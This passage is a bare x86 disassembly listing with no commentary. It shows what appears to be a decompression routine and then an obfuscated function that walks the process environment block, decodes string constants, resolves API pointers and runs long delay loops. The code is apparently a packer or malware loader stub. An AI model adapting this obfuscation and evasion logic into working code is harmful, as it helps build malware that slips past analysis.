  425f99:	lods   al,BYTE PTR ds:[esi]
  425f9a:	mov    edi,DWORD PTR [ebp-0x4]
  425f9d:	stos   BYTE PTR es:[edi],al
  425f9e:	jmp    0x426131
  425fa3:	mov    al,0xd8
  425fa5:	call   0x4261a3
  425faa:	mov    esi,DWORD PTR [ebp-0x28]
  425fad:	je     0x425fca
  425faf:	mov    al,0xe4
  425fb1:	call   0x4261a3
  425fb6:	mov    esi,DWORD PTR [ebp-0x2c]
  425fb9:	je     0x425fc4
  425fbb:	mov    esi,DWORD PTR [ebp-0x30]
  425fbe:	mov    ecx,DWORD PTR [ebp-0x2c]
  425fc1:	mov    DWORD PTR [ebp-0x30],ecx
  425fc4:	mov    ecx,DWORD PTR [ebp-0x28]
  425fc7:	mov    DWORD PTR [ebp-0x2c],ecx
  425fca:	mov    ecx,DWORD PTR [ebp-0x24]
  425fcd:	mov    DWORD PTR [ebp-0x28],ecx
  425fd0:	mov    DWORD PTR [ebp-0x24],esi
  425fd3:	pop    eax
  425fd4:	pop    edi
  425fd5:	pop    ecx
  425fd6:	mov    edx,0xa68
  425fdb:	mov    cl,0x8
  425fdd:	add    edx,edi
  425fdf:	push   edx
  425fe0:	push   edi
  425fe1:	cmp    al,0x7
  425fe3:	mov    al,cl
  425fe5:	jb     0x425fe9
  425fe7:	add    al,0x3
  425fe9:	push   eax
  425fea:	mov    ebp,DWORD PTR [ebp-0x34]
  425fed:	call   0x4261b0
  425ff2:	jne    0x426008
  425ff4:	mov    eax,DWORD PTR [ebp-0x18]
  425ff7:	mov    edi,DWORD PTR [ebp-0x34]
  425ffa:	shl    eax,0x3
  425ffd:	sub    ecx,ecx
  425fff:	push   0x8
  426001:	pop    esi
  426002:	lea    edi,[edi+eax*2+0x4]
  426006:	jmp    0x42603d
  426008:	mov    ebp,DWORD PTR [ebp-0x34]
  42600b:	add    ebp,0x2
  42600e:	call   0x4261b0
  426013:	jne    0x42602d
  426015:	mov    eax,DWORD PTR [ebp-0x18]
  426018:	mov    edi,DWORD PTR [ebp-0x34]
  42601b:	shl    eax,0x3
  42601e:	push   0x8
  426020:	pop    ecx
  426021:	push   0x8
  426023:	pop    esi
  426024:	lea    edi,[edi+eax*2+0x104]
  42602b:	jmp    0x42603d
  42602d:	mov    edi,0x204
  426032:	add    edi,DWORD PTR [ebp-0x34]
  426035:	push   0x10
  426037:	pop    ecx
  426038:	mov    esi,0x100
  42603d:	mov    DWORD PTR [ebp-0x1c],ecx
  426040:	sub    eax,eax
  426042:	inc    eax
  426043:	mov    ebp,edi
  426045:	call   0x4261b2
  42604a:	mov    ecx,eax
  42604c:	sub    ecx,esi
  42604e:	jb     0x426043
  426050:	add    DWORD PTR [ebp-0x1c],ecx
  426053:	cmp    DWORD PTR [ebp-0x3c],0x4
  426057:	jae    0x42610d
  42605d:	add    DWORD PTR [ebp-0x3c],0x7
  426061:	mov    ecx,DWORD PTR [ebp-0x1c]
  426064:	cmp    ecx,0x4
  426067:	jb     0x42606c
  426069:	push   0x3
  42606b:	pop    ecx
  42606c:	mov    edi,DWORD PTR [ebp-0x38]
  42606f:	shl    ecx,0x6
  426072:	sub    eax,eax
  426074:	inc    eax
  426075:	push   0x40
  426077:	pop    esi
  426078:	lea    edi,[edi+ecx*2+0x360]
  42607f:	mov    ebp,edi
  426081:	call   0x4261b2
  426086:	mov    ecx,eax
  426088:	sub    ecx,esi
  42608a:	jb     0x42607f
  42608c:	mov    DWORD PTR [ebp-0x18],ecx
  42608f:	mov    DWORD PTR [ebp-0x24],ecx
  426092:	cmp    ecx,0x4
  426095:	jb     0x42610a
  426097:	mov    esi,ecx
  426099:	and    DWORD PTR [ebp-0x24],0x1
  42609d:	shr    esi,1
  42609f:	or     DWORD PTR [ebp-0x24],0x2
  4260a3:	dec    esi
  4260a4:	cmp    ecx,0xe
  4260a7:	jae    0x4260c2
  4260a9:	mov    eax,0x2af
  4260ae:	sub    eax,ecx
  4260b0:	mov    ecx,esi
  4260b2:	shl    BYTE PTR [ebp-0x24],cl
  4260b5:	add    eax,DWORD PTR [ebp-0x24]
  4260b8:	shl    eax,1
  4260ba:	add    eax,DWORD PTR [ebp-0x38]
  4260bd:	mov    DWORD PTR [ebp-0x34],eax
  4260c0:	jmp    0x4260ef
  4260c2:	sub    esi,0x4
  4260c5:	call   0x42616f
  4260ca:	shr    ebx,1
  4260cc:	shl    DWORD PTR [ebp-0x24],1
  4260cf:	cmp    DWORD PTR [ebp-0x20],ebx
  4260d2:	jb     0x4260da
  4260d4:	inc    DWORD PTR [ebp-0x24]
  4260d7:	sub    DWORD PTR [ebp-0x20],ebx
  4260da:	dec    esi
  4260db:	jne    0x4260c5
  4260dd:	mov    eax,0x644
  4260e2:	add    eax,DWORD PTR [ebp-0x38]
  4260e5:	mov    DWORD PTR [ebp-0x34],eax
  4260e8:	shl    DWORD PTR [ebp-0x24],0x4
  4260ec:	push   0x4
  4260ee:	pop    esi
  4260ef:	sub    edi,edi
  4260f1:	inc    edi
  4260f2:	mov    eax,edi
  4260f4:	mov    ebp,DWORD PTR [ebp-0x34]
  4260f7:	call   0x4261b2
  4260fc:	test   al,0x1
  4260fe:	je     0x426103
  426100:	or     DWORD PTR [ebp-0x24],edi
  426103:	shl    edi,1
  426105:	dec    esi
  426106:	jne    0x4260f4
  426108:	jmp    0x42610a
  42610a:	inc    DWORD PTR [ebp-0x24]
  42610d:	mov    ecx,DWORD PTR [ebp-0x1c]
  426110:	add    ecx,0x2
  426113:	mov    edi,DWORD PTR [ebp-0x4]
  426116:	mov    eax,edi
  426118:	sub    eax,DWORD PTR [ebp+0x24]
  42611b:	cmp    DWORD PTR [ebp-0x24],eax
  42611e:	ja     0x42616a
  426120:	mov    esi,edi
  426122:	sub    esi,DWORD PTR [ebp-0x24]
  426125:	mov    edx,DWORD PTR [ebp+0x28]
  426128:	lods   al,BYTE PTR ds:[esi]
  426129:	stos   BYTE PTR es:[edi],al
  42612a:	cmp    edi,edx
  42612c:	jae    0x426131
  42612e:	dec    ecx
  42612f:	jne    0x426128
  426131:	mov    DWORD PTR [ebp-0x4],edi
  426134:	movzx  esi,al
  426137:	cmp    edi,DWORD PTR [ebp+0x28]
  42613a:	jb     0x425e9b
  426140:	call   0x42616f
  426145:	sub    eax,eax
  426147:	lea    ebp,[esp+0x3c]
  42614b:	mov    edx,DWORD PTR [ebp+0x20]
  42614e:	mov    esi,DWORD PTR [ebp-0x8]
  426151:	sub    esi,DWORD PTR [ebp+0x18]
  426154:	mov    DWORD PTR [edx],esi
  426156:	mov    dh,0xdd
  426158:	cmp    BYTE PTR [esi+0x7d347b7d],dh
  42615e:	sbb    BYTE PTR [esi+0x1f5af70],ch
  426164:	add    eax,0x188f893
  426169:	jmp    0x37cbeca2
  42616e:	jmp    0x4260fe
  426170:	ja     0x4260fa
  426172:	mov    BYTE PTR [eax-0x6873ae74],cl
  426178:	(bad)  
  426179:	pop    ss
  42617a:	test   al,0xe1
  42617c:	mov    dh,0x5d
  42617e:	imul   esi,DWORD PTR [ebp+ebx*2-0x8],0x55
  426183:	sbb    esi,DWORD PTR [esi+0xb8f0b9d]
  426189:	test   al,0x3a
  42618b:	scas   al,BYTE PTR es:[edi]
  42618c:	popf   
  42618d:	or     ebp,DWORD PTR [esi-0x68fe94a3]
  426193:	mov    dh,0xbd
  426195:	fwait
  426196:	les    esp,FWORD PTR [edx-0x75]
  426199:	(bad)  
  42619a:	sets   BYTE PTR [ebp+ebx*4+0x378f942b]
  4261a2:	mov    al,ds:0x948b62c4
  4261a7:	popf   
  4261a8:	fwait
  4261a9:	mov    dh,0x3d
  4261ab:	stos   DWORD PTR es:[edi],eax
  4261ac:	mov    esi,0x34889d39
  4261b1:	mov    edi,DWORD PTR [esi-0x717762c7]
  4261b7:	ja     0x426141
  4261b9:	mov    BYTE PTR [eax-0x4907aa74],cl
  4261bf:	mov    ecx,0x198f6818
  4261c4:	sbb    BYTE PTR [eax],cl
  4261c6:	test   al,0x74
  4261c8:	mov    ecx,0xfa55f918
  4261cd:	mov    dl,0xcc
  4261cf:	xchg   DWORD PTR [ecx+0x178f6818],ebx
  4261d5:	test   al,0x88
  4261d7:	push   esp
  4261d8:	and    al,0x20
  4261da:	mov    ecx,ebx
  4261dc:	movzx  edx,WORD PTR [ebp+0x0]
  4261e0:	shr    ecx,0xb
  4261e3:	imul   ecx,edx
  4261e6:	cmp    DWORD PTR [esp+0x20],ecx
  4261ea:	jae    0x426203
  4261ec:	mov    ebx,ecx
  4261ee:	mov    ecx,0x800
  4261f3:	sub    ecx,edx
  4261f5:	shr    ecx,0x5
  4261f8:	add    WORD PTR [ebp+0x0],cx
  4261fc:	add    eax,eax
  4261fe:	lea    ebp,[esp+0x40]
  426202:	ret    
  426203:	shr    edx,0x5
  426206:	sub    DWORD PTR [esp+0x20],ecx
  42620a:	sub    ebx,ecx
  42620c:	sub    WORD PTR [ebp+0x0],dx
  426210:	add    eax,eax
  426212:	add    eax,0x1
  426215:	lea    ebp,[esp+0x40]
  426219:	ret    
  42621a:	push   ebp
  42621b:	mov    ebp,esp
  42621d:	sub    esp,0x12c
  426223:	push   ebx
  426224:	push   esi
  426225:	push   edi
  426226:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  42622d:	mov    DWORD PTR [ebp-0x18],0xf89c85a2
  426234:	mov    eax,DWORD PTR [ebp+0x8]
  426237:	mov    DWORD PTR [ebp+0x8],eax
  42623a:	mov    ecx,DWORD PTR [ebp-0x10]
  42623d:	mov    ebx,0x75108ae
  426242:	xor    ecx,ebx
  426244:	mov    eax,0x3272f5
  426249:	add    ecx,eax
  42624b:	mov    DWORD PTR [ebp-0x24],ecx
  42624e:	mov    ecx,DWORD PTR [ebp-0x10]
  426251:	xor    ecx,ebx
  426253:	add    ecx,eax
  426255:	mov    DWORD PTR [ebp-0x40],ecx
  426258:	mov    ecx,DWORD PTR [ebp-0x10]
  42625b:	xor    ecx,ebx
  42625d:	add    ecx,eax
  42625f:	mov    DWORD PTR [ebp-0x3c],ecx
  426262:	mov    ecx,DWORD PTR [ebp-0x10]
  426265:	xor    ecx,ebx
  426267:	add    ecx,eax
  426269:	mov    DWORD PTR [ebp-0xd8],ecx
  42626f:	mov    DWORD PTR [ebp-0x50],0xf89f05a5
  426276:	mov    DWORD PTR [ebp-0x3c],0xf89cb5a5
  42627d:	mov    DWORD PTR [ebp-0x54],0xf89c85a1
  426284:	push   0x25
  426286:	pop    ecx
  426287:	mov    DWORD PTR [ebp-0x30],ecx
  42628a:	mov    DWORD PTR [ebp-0x30],ecx
  42628d:	push   0x65
  42628f:	pop    ecx
  426290:	mov    DWORD PTR [ebp-0x30],ecx
  426293:	mov    DWORD PTR [ebp-0x30],ecx
  426296:	mov    DWORD PTR [ebp-0x30],0x4d
  42629d:	mov    DWORD PTR [ebp-0x30],0x43
  4262a4:	mov    ecx,DWORD PTR [ebp-0x10]
  4262a7:	xor    ecx,ebx
  4262a9:	add    ecx,eax
  4262ab:	mov    DWORD PTR [ebp-0x30],ecx
  4262ae:	mov    ecx,DWORD PTR [ebp-0x10]
  4262b1:	xor    ecx,ebx
  4262b3:	add    ecx,eax
  4262b5:	mov    DWORD PTR [ebp-0x30],ecx
  4262b8:	mov    DWORD PTR [ebp-0x28],0x258
  4262bf:	mov    DWORD PTR [ebp-0x34],0x36
  4262c6:	mov    DWORD PTR [ebp-0x14],0x7a
  4262cd:	lea    edi,[ebp-0x10c]
  4262d3:	lea    esi,[ebp-0x12c]
  4262d9:	call   0x426f99
  4262de:	dec    DWORD PTR [ebp-0x14]
  4262e1:	jne    0x4262cd
  4262e3:	dec    DWORD PTR [ebp-0x34]
  4262e6:	jne    0x4262c6
  4262e8:	dec    DWORD PTR [ebp-0x28]
  4262eb:	jne    0x4262bf
  4262ed:	mov    DWORD PTR [ebp-0x28],0x400e
  4262f4:	mov    eax,DWORD PTR [ebp-0x10]
  4262f7:	xor    eax,ebx
  4262f9:	mov    esi,0x3272f5
  4262fe:	add    eax,esi
  426300:	mov    DWORD PTR [ebp-0x1c],eax
  426303:	mov    eax,DWORD PTR [ebp-0x10]
  426306:	and    DWORD PTR [ebp-0x94],0x0
  42630d:	xor    eax,ebx
  42630f:	add    eax,esi
  426311:	mov    DWORD PTR [ebp-0x38],eax
  426314:	mov    eax,fs:0x18
  42631a:	mov    DWORD PTR [ebp-0x94],eax
  426320:	mov    eax,DWORD PTR [eax+0x30]
  426323:	mov    DWORD PTR [ebp-0xcc],eax
  426329:	mov    eax,DWORD PTR [eax+0xc]
  42632c:	mov    DWORD PTR [ebp-0xc0],eax
  426332:	mov    eax,DWORD PTR [ebp+0x8]
  426335:	lea    ecx,[ebp-0x94]
  42633b:	mov    DWORD PTR [eax+0x1a0],ecx
  426341:	mov    eax,DWORD PTR [ebp+0x8]
  426344:	lea    ecx,[ebp-0xcc]
  42634a:	mov    DWORD PTR [eax+0x1a4],ecx
  426350:	mov    eax,DWORD PTR [ebp+0x8]
  426353:	push   DWORD PTR [ebp+0x8]
  426356:	lea    ecx,[ebp-0xc0]
  42635c:	mov    DWORD PTR [eax+0x1a8],ecx
  426362:	call   0x42875a
  426367:	mov    ecx,DWORD PTR [ebp-0x10]
  42636a:	xor    ecx,ebx
  42636c:	add    ecx,esi
  42636e:	cmp    ecx,eax
  426370:	je     0x4266f3
  426376:	mov    eax,DWORD PTR [ebp+0x8]
  426379:	mov    eax,DWORD PTR [eax+0x194]
  42637f:	mov    ecx,DWORD PTR [eax]
  426381:	mov    eax,DWORD PTR [ebp+0x8]
  426384:	mov    eax,DWORD PTR [eax+0x194]
  42638a:	mov    eax,DWORD PTR [eax]
  42638c:	add    eax,DWORD PTR [ecx+0x3c]
  42638f:	mov    ecx,DWORD PTR [ebp+0x8]
  426392:	mov    ecx,DWORD PTR [ecx+0x1e0]
  426398:	lea    edx,[ebp-0xec]
  42639e:	push   edx
  42639f:	mov    edx,DWORD PTR [ebp+0x8]
  4263a2:	mov    edx,DWORD PTR [edx+0x18c]
  4263a8:	mov    edx,DWORD PTR [edx]
  4263aa:	add    edx,DWORD PTR [eax+0x88]
  4263b0:	push   0x4
  4263b2:	push   DWORD PTR [eax+0x8c]
  4263b8:	push   edx
  4263b9:	call   DWORD PTR [ecx+0x1c]
  4263bc:	push   DWORD PTR [ebp+0x8]
  4263bf:	xor    eax,eax
  4263c1:	mov    DWORD PTR [ebp-0xa8],0x1b3e0e38
  4263cb:	mov    DWORD PTR [ebp-0xa4],0x12371120
  4263d5:	mov    DWORD PTR [ebp-0xa0],0x40111c0a
  4263df:	mov    BYTE PTR [ebp-0x9c],0x83
  4263e6:	lea    edi,[ebp-0x9b]
  4263ec:	stos   DWORD PTR es:[edi],eax
  4263ed:	stos   WORD PTR es:[edi],ax
  4263ef:	stos   BYTE PTR es:[edi],al
  4263f0:	xor    eax,eax
  4263f2:	mov    DWORD PTR [ebp-0xbc],0x1b3e0e38
  4263fc:	mov    DWORD PTR [ebp-0xb8],0x12371120
  426406:	mov    DWORD PTR [ebp-0xb4],0x2a111c0a
  426410:	mov    BYTE PTR [ebp-0xb0],0x83
  426417:	lea    edi,[ebp-0xaf]
  42641d:	stos   DWORD PTR es:[edi],eax
  42641e:	stos   WORD PTR es:[edi],ax
  426420:	stos   BYTE PTR es:[edi],al
  426421:	mov    edi,DWORD PTR [ebp+0x8]
  426424:	mov    eax,DWORD PTR [ebp+0x8]
  426427:	mov    edx,DWORD PTR [eax+0x1b8]
  42642d:	mov    DWORD PTR [ebp-0x68],0x110f0e17
  426434:	mov    DWORD PTR [ebp-0x64],0x1813141e
  42643b:	mov    WORD PTR [ebp-0x60],0x8340
  426441:	mov    DWORD PTR [ebp-0x90],0x1b3e0e38
  42644b:	mov    DWORD PTR [ebp-0x8c],0x17401120
  426455:	mov    DWORD PTR [ebp-0x88],0x35201b13
  42645f:	mov    DWORD PTR [ebp-0x84],0x111c140c
  426469:	mov    DWORD PTR [ebp-0x80],0x83401e18
  426470:	mov    DWORD PTR [ebp-0x7c],0x1b3e0e38
  426477:	mov    DWORD PTR [ebp-0x78],0x17401120
  42647e:	mov    DWORD PTR [ebp-0x74],0x35201b13
  426485:	mov    DWORD PTR [ebp-0x70],0x111c140c
  42648c:	mov    DWORD PTR [ebp-0x6c],0x832a1e18
  426493:	call   0x428789
  426498:	push   eax
  426499:	mov    eax,DWORD PTR [ebp+0x8]
  42649c:	mov    eax,DWORD PTR [eax+0x1a8]
  4264a2:	push   DWORD PTR [eax]
  4264a4:	call   0x42842a
  4264a9:	test   eax,eax
  4264ab:	jne    0x4264fd
  4264ad:	mov    eax,DWORD PTR [ebp+0x8]
  4264b0:	mov    eax,DWORD PTR [eax+0x1e0]
  4264b6:	mov    edi,DWORD PTR [ebp+0x8]
  4264b9:	add    eax,0x4
  4264bc:	mov    DWORD PTR [ebp-0x20],eax
  4264bf:	mov    eax,DWORD PTR [ebp+0x8]
  4264c2:	mov    edx,DWORD PTR [eax+0x1b8]
  4264c8:	call   0x428789
  4264cd:	push   eax
  4264ce:	mov    eax,DWORD PTR [ebp-0x20]
  4264d1:	call   DWORD PTR [eax]
  4264d3:	test   eax,eax
  4264d5:	jne    0x4264fd
  4264d7:	mov    eax,DWORD PTR [ebp+0x8]
  4264da:	mov    eax,DWORD PTR [eax+0x1e0]
  4264e0:	mov    edi,DWORD PTR [ebp+0x8]
  4264e3:	add    eax,0x10
  4264e6:	mov    DWORD PTR [ebp-0x20],eax
  4264e9:	mov    eax,DWORD PTR [ebp+0x8]
  4264ec:	mov    edx,DWORD PTR [eax+0x1b8]
  4264f2:	call   0x428789
  4264f7:	push   eax
  4264f8:	mov    eax,DWORD PTR [ebp-0x20]
  4264fb:	call   DWORD PTR [eax]
  4264fd:	mov    eax,DWORD PTR [ebp-0x10]
  426500:	mov    ecx,DWORD PTR [ebp-0x28]
  426503:	xor    eax,ebx
  426505:	add    eax,esi
  426507:	cmp    eax,ecx
  426509:	je     0x4266cc
  42650f:	mov    eax,DWORD PTR [ebp-0x18]
  426512:	xor    eax,ebx
  426514:	mov    ecx,0xffcd8d0b
  426519:	sub    ecx,eax
  42651b:	add    ecx,DWORD PTR [ebp-0x28]
  42651e:	mov    eax,DWORD PTR [ebp-0x1c]
  426521:	cmp    eax,ecx
  426523:	ja     0x4266cc
  426529:	mov    DWORD PTR [ebp-0x34],0x0
  426530:	push   DWORD PTR [ebp+0x8]
  426533:	mov    edi,DWORD PTR [ebp+0x8]
  426536:	mov    eax,DWORD PTR [ebp+0x8]
  426539:	mov    edx,DWORD PTR [eax+0x1b4]
  42653f:	call   0x428789
  426544:	push   eax
  426545:	mov    eax,DWORD PTR [ebp+0x8]
  426548:	mov    eax,DWORD PTR [eax+0x1a8]
  42654e:	push   DWORD PTR [eax]
  426550:	call   0x42842a
  426555:	mov    ecx,DWORD PTR [ebp+0x8]
  426558:	mov    ecx,DWORD PTR [ecx+0x19c]
  42655e:	mov    DWORD PTR [ecx],eax
  426560:	mov    eax,DWORD PTR [ebp+0x8]
  426563:	mov    edi,DWORD PTR [eax+0x1e0]
  426569:	mov    esi,DWORD PTR [ebp+0x8]
  42656c:	xor    eax,eax
  42656e:	lea    edx,[ebp-0x7c]
  426571:	call   0x4287bf
  426576:	push   eax
  426577:	mov    eax,DWORD PTR [ebp+0x8]
  42657a:	mov    eax,DWORD PTR [eax+0x19c]
  426580:	push   DWORD PTR [eax]
  426582:	call   DWORD PTR [edi+0x8]
  426585:	mov    DWORD PTR [ebp-0x20],eax
  426588:	mov    eax,DWORD PTR [ebp+0x8]
  42658b:	mov    edi,DWORD PTR [eax+0x1e0]
  426591:	mov    esi,DWORD PTR [ebp+0x8]
  426594:	xor    eax,eax
  426596:	lea    edx,[ebp-0x90]
  42659c:	call   0x4287bf
  4265a1:	push   eax
  4265a2:	mov    eax,DWORD PTR [ebp+0x8]
  4265a5:	mov    eax,DWORD PTR [eax+0x19c]
  4265ab:	push   DWORD PTR [eax]
  4265ad:	call   DWORD PTR [edi+0x8]
  4265b0:	mov    eax,DWORD PTR [ebp+0x8]
  4265b3:	mov    edi,DWORD PTR [eax+0x1e0]
  4265b9:	mov    esi,DWORD PTR [ebp+0x8]
  4265bc:	xor    eax,eax
  4265be:	lea    edx,[ebp-0xa8]
  4265c4:	call   0x4287bf
  4265c9:	push   eax
  4265ca:	mov    eax,DWORD PTR [ebp+0x8]
  4265cd:	mov    eax,DWORD PTR [eax+0x19c]
  4265d3:	push   DWORD PTR [eax]
  4265d5:	call   DWORD PTR [edi+0x8]
  4265d8:	and    DWORD PTR [ebp-0x8],0x0
  4265dc:	mov    DWORD PTR [ebp-0x48],eax
  4265df:	mov    eax,DWORD PTR [ebp-0x8]
  4265e2:	and    eax,0x7
  4265e5:	add    eax,0x31
  4265e8:	push   eax
  4265e9:	call   DWORD PTR [ebp-0x20]
  4265ec:	test   eax,eax
  4265ee:	je     0x426632
  4265f0:	mov    eax,DWORD PTR [ebp-0x8]
  4265f3:	push   0x19
  4265f5:	xor    edx,edx
  4265f7:	pop    ecx
  4265f8:	div    ecx
  4265fa:	add    dl,0x41
  4265fd:	movzx  eax,dl
  426600:	push   eax
  426601:	call   DWORD PTR [ebp-0x48]
  426604:	test   eax,eax
  426606:	jne    0x426632
  426608:	mov    eax,DWORD PTR [ebp+0x8]
  42660b:	mov    edi,DWORD PTR [eax+0x1e0]
  426611:	mov    esi,DWORD PTR [ebp+0x8]
  426614:	xor    eax,eax
  426616:	lea    edx,[ebp-0x68]
  426619:	call   0x4287bf
  42661e:	push   eax
  42661f:	mov    eax,DWORD PTR [ebp+0x8]
  426622:	mov    eax,DWORD PTR [eax+0x198]
  426628:	push   DWORD PTR [eax]
  42662a:	call   DWORD PTR [edi+0x8]
  42662d:	mov    DWORD PTR [ebp-0x14],eax
  426630:	jmp    0x426636
  426632:	and    DWORD PTR [ebp-0x14],0x0
  426636:	inc    DWORD PTR [ebp-0x8]
  426639:	cmp    DWORD PTR [ebp-0x8],0x10
  42663d:	jb     0x4265df
  42663f:	mov    eax,DWORD PTR [ebp-0x18]
  426642:	mov    esi,DWORD PTR [ebp+0x8]
  426645:	xor    eax,ebx
  426647:	mov    edi,0x3272f5
  42664c:	add    eax,edi
  42664e:	lea    edx,[ebp-0x10c]
  426654:	call   0x4287bf
  426659:	push   eax
  42665a:	mov    eax,DWORD PTR [ebp-0x10]
  42665d:	mov    esi,DWORD PTR [ebp+0x8]
  426660:	xor    eax,ebx
  426662:	add    eax,edi
  426664:	lea    edx,[ebp-0x12c]
  42666a:	call   0x4287bf
  42666f:	push   eax
  426670:	call   DWORD PTR [ebp-0x14]
  426673:	mov    ecx,DWORD PTR [ebp-0x10]
  426676:	xor    ecx,ebx
  426678:	add    ecx,edi
  42667a:	cmp    ecx,eax
  42667c:	jne    0x426685
  42667e:	mov    DWORD PTR [ebp-0x34],0x1
  426685:	mov    eax,DWORD PTR [ebp-0x18]
  426688:	mov    ecx,DWORD PTR [ebp-0x1c]
  42668b:	xor    eax,ebx
  42668d:	lea    eax,[eax+ecx*1+0x3272f5]
  426694:	mov    DWORD PTR [ebp-0x1c],eax
  426697:	mov    eax,DWORD PTR [ebp-0x34]
  42669a:	test   eax,eax
  42669c:	je     0x4266b0
  42669e:	mov    eax,DWORD PTR [ebp-0x18]
  4266a1:	mov    ecx,DWORD PTR [ebp-0x38]
  4266a4:	xor    eax,ebx
  4266a6:	lea    eax,[eax+ecx*1+0x3272f5]
  4266ad:	mov    DWORD PTR [ebp-0x38],eax
  4266b0:	mov    eax,DWORD PTR [ebp-0x18]
  4266b3:	xor    eax,ebx
  4266b5:	mov    ecx,0xffcd8d0b
  4266ba:	sub    ecx,eax
  4266bc:	add    ecx,DWORD PTR [ebp-0x28]
  4266bf:	mov    eax,DWORD PTR [ebp-0x1c]
  4266c2:	cmp    eax,ecx
  4266c4:	jbe    0x426529
  4266ca:	mov    esi,edi
  4266cc:	mov    eax,DWORD PTR [ebp-0x38]
  4266cf:	mov    ecx,DWORD PTR [ebp-0x1c]
  4266d2:	cmp    ecx,eax
  4266d4:	jne    0x4266e7
  4266d6:	push   DWORD PTR [ebp+0x8]
  4266d9:	lea    eax,[ebp-0x40]
  4266dc:	push   eax
  4266dd:	call   0x42922e
  4266e2:	mov    DWORD PTR [ebp-0x24],eax
  4266e5:	jmp    0x4266f3
  4266e7:	mov    eax,DWORD PTR [ebp-0x24]
  4266ea:	mov    ecx,DWORD PTR [ebp-0x18]
  4266ed:	xor    ecx,ebx
  4266ef:	add    ecx,esi
  4266f1:	xor    DWORD PTR [eax],ecx
  4266f3:	mov    eax,DWORD PTR [ebp-0x10]
  4266f6:	mov    ecx,DWORD PTR [ebp-0x24]
  4266f9:	xor    eax,ebx
  4266fb:	add    eax,esi
  4266fd:	cmp    eax,ecx
  4266ff:	je     0x426e77
  426705:	mov    eax,DWORD PTR [ebp-0x10]
  426708:	mov    ecx,DWORD PTR [ebp-0x40]
  42670b:	xor    eax,ebx
  42670d:	add    eax,esi
  42670f:	cmp    eax,ecx
  426711:	je     0x426e77
  426717:	mov    eax,DWORD PTR [ebp-0x10]
  42671a:	xor    eax,ebx
  42671c:	add    eax,esi
  42671e:	jmp    0x42673c
  426720:	mov    edi,DWORD PTR [ebp-0x24]
  426723:	mov    cl,al
  426725:	and    cl,0x1f
  426728:	or     dl,0xff
  42672b:	sub    dl,cl
  42672d:	add    BYTE PTR [edi+eax*1],dl
  426730:	mov    ecx,DWORD PTR [ebp-0x18]
  426733:	xor    ecx,ebx
  426735:	lea    eax,[eax+ecx*1+0x3272f5]
  42673c:	mov    ecx,DWORD PTR [ebp-0x40]
  42673f:	cmp    eax,ecx
  426741:	jb     0x426720
  426743:	mov    eax,DWORD PTR [ebp-0x40]
  426746:	mov    DWORD PTR [ebp-0x28],eax
  426749:	mov    eax,DWORD PTR [ebp-0x24]
  42674c:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  426753:	mov    DWORD PTR [ebp-0xd4],eax
  426759:	mov    edi,0xf89c85a2
  42675e:	mov    DWORD PTR [ebp-0x2c],edi
  426761:	mov    eax,DWORD PTR [ebp-0x38]
  426764:	xor    eax,ebx
  426766:	add    eax,esi
  426768:	mov    DWORD PTR [ebp-0xc],eax
  42676b:	mov    eax,DWORD PTR [ebp-0x38]
  42676e:	xor    eax,ebx
  426770:	add    eax,esi
  426772:	mov    DWORD PTR [ebp-0x8],eax
  426775:	mov    DWORD PTR [ebp-0x48],0xf89c8585
  42677c:	mov    DWORD PTR [ebp-0x4c],0xf89c85bc
  426783:	mov    eax,DWORD PTR [ebp-0x38]
  426786:	mov    ecx,DWORD PTR [ebp-0x28]
  426789:	xor    eax,ebx
  42678b:	add    eax,esi
  42678d:	cmp    ecx,eax
  42678f:	je     0x42698e
  426795:	jmp    0x42696a
  42679a:	mov    ecx,DWORD PTR [ebp-0xc]
  42679d:	mov    eax,DWORD PTR [ebp-0x28]
  4267a0:	sub    eax,ecx
  4267a2:	mov    ecx,DWORD PTR [ebp-0x48]
  4267a5:	xor    ecx,ebx
  4267a7:	add    ecx,esi
  4267a9:	xor    edx,edx
  4267ab:	div    ecx
  4267ad:	mov    DWORD PTR [ebp-0x8],eax
  4267b0:	mov    eax,DWORD PTR [ebp-0x4c]
  4267b3:	mov    ecx,DWORD PTR [ebp-0x8]
  4267b6:	xor    eax,ebx
  4267b8:	add    eax,esi
  4267ba:	cmp    ecx,eax
  4267bc:	jbe    0x4267c8
  4267be:	mov    eax,DWORD PTR [ebp-0x4c]
  4267c1:	xor    eax,ebx
  4267c3:	add    eax,esi
  4267c5:	mov    DWORD PTR [ebp-0x8],eax
  4267c8:	mov    eax,DWORD PTR [ebp-0x48]
  4267cb:	mov    ecx,DWORD PTR [ebp-0x8]
  4267ce:	xor    eax,ebx
  4267d0:	add    eax,esi
  4267d2:	imul   eax,ecx
  4267d5:	mov    DWORD PTR [ebp-0x8],eax
  4267d8:	mov    eax,DWORD PTR [ebp-0x38]
  4267db:	mov    ecx,DWORD PTR [ebp-0x8]
  4267de:	xor    eax,ebx
  4267e0:	add    eax,esi
  4267e2:	cmp    ecx,eax
  4267e4:	je     0x426958
  4267ea:	mov    eax,DWORD PTR [ebp-0x8]
  4267ed:	mov    DWORD PTR [ebp-0x14],eax
  4267f0:	mov    eax,DWORD PTR [ebp-0xc]
  4267f3:	add    eax,DWORD PTR [ebp-0xd4]
  4267f9:	mov    DWORD PTR [ebp-0x20],0xf89c85a5
  426800:	mov    DWORD PTR [ebp-0x34],edi
  426803:	mov    DWORD PTR [ebp-0xe8],0xf89c85a3
  42680d:	mov    DWORD PTR [ebp-0x8],eax
  426810:	mov    DWORD PTR [ebp-0x30],0xf89c85a0
  426817:	mov    DWORD PTR [ebp-0x1c],edi
  42681a:	mov    eax,DWORD PTR [ebp-0x20]
  42681d:	xor    eax,ebx
  42681f:	add    eax,esi
  426821:	jmp    0x426917
  426826:	mov    DWORD PTR [ebp-0xe0],0xf89c85b8
  426830:	mov    DWORD PTR [ebp-0xc4],0xf89c858f
  42683a:	mov    eax,DWORD PTR [ebp-0x1c]
  42683d:	mov    ecx,DWORD PTR [ebp-0x44]
  426840:	xor    eax,ebx
  426842:	add    eax,esi
  426844:	imul   eax,ecx
  426847:	mov    ecx,DWORD PTR [ebp-0x8]
  42684a:	mov    al,BYTE PTR [eax+ecx*1]
  42684d:	mov    BYTE PTR [ebp-0x2],al
  426850:	mov    eax,DWORD PTR [ebp-0x1c]
  426853:	mov    ecx,DWORD PTR [ebp-0x44]
  426856:	xor    eax,ebx
  426858:	add    eax,esi
  42685a:	imul   eax,ecx
  42685d:	mov    ecx,DWORD PTR [ebp-0xe8]
  426863:	xor    ecx,ebx
  426865:	add    eax,ecx
